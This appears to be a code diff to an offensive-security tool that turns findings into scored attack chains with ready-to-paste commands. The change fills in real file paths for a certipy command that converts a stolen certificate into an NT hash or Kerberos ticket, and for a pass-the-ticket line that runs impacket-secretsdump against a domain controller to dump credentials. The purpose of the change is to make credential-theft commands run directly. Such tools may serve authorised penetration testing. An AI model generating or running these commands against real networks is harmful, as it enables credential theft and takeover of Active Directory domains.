@@ -576,9 +576,13 @@ def run(report, store, ui=None):
     # secondary or keyword.py PFX rule).
     if e.has_cert:
         s, l = e.cert_src
+        # iter-71: use the actual .pfx source path instead of '<file.pfx>' so
+        # the operator gets a ready-to-run command. Fall back to placeholder
+        # when src looks empty/generic.
+        _pfx_path = s if s and s.lower().endswith((".pfx", ".p12")) else "<file.pfx>"
         chains.append(Chain("R16", "AD CS cert", "PKCS#12 cert/key (certipy -> NT hash/TGT)",
             crit=8, conf=0.8, ready=1.4, prox=0.85,        # score 7.62
-            commands=[f"certipy auth -pfx <file.pfx> -password '<pfx-password-if-set>' -dc-ip {dc()}",
+            commands=[f"certipy auth -pfx '{_pfx_path}' -password '<pfx-password-if-set>' -dc-ip {dc()}",
                       "then PtH the recovered NT hash (see R7)"], src=s, line=l))
     # ccache / kirbi. iter-16: removed literal '-FQDN' suffix on dc() that
     # produced an unresolvable hostname '10.10.10.5-FQDN'. Kerberos requires
@@ -589,9 +593,14 @@ def run(report, store, ui=None):
         _dom_r26 = store.dominant_domain() or "<dom>"
         _dc_fqdn_r26 = store.dc_fqdn() or "<DC-FQDN>"
         _dc_ip_r26 = store.dc_ip() or "<DC-IP>"
+        # iter-71: use the actual ticket file path instead of the placeholder
+        # so the operator can paste the export line directly. Accepts .ccache,
+        # .kirbi, and krb5cc_* files (all valid impacket ticket formats).
+        _ccache_path = s if s and (s.lower().endswith((".ccache", ".kirbi"))
+                                    or "krb5cc" in s.lower()) else "<ticket.ccache>"
         chains.append(Chain("R26", "pass-the-ticket", "Kerberos ticket present",
             crit=6, conf=0.8, ready=1.4, prox=0.8,
-            commands=[f"export KRB5CCNAME=<ticket.ccache>; "
+            commands=[f"export KRB5CCNAME='{_ccache_path}'; "
                       f"impacket-secretsdump -k -no-pass -dc-ip {_dc_ip_r26} "
                       f"{_dom_r26}/<user>@{_dc_fqdn_r26}   "
                       f"# Kerberos: hostname MUST be the DC FQDN (SPN in ticket), not the IP {dc()}"],
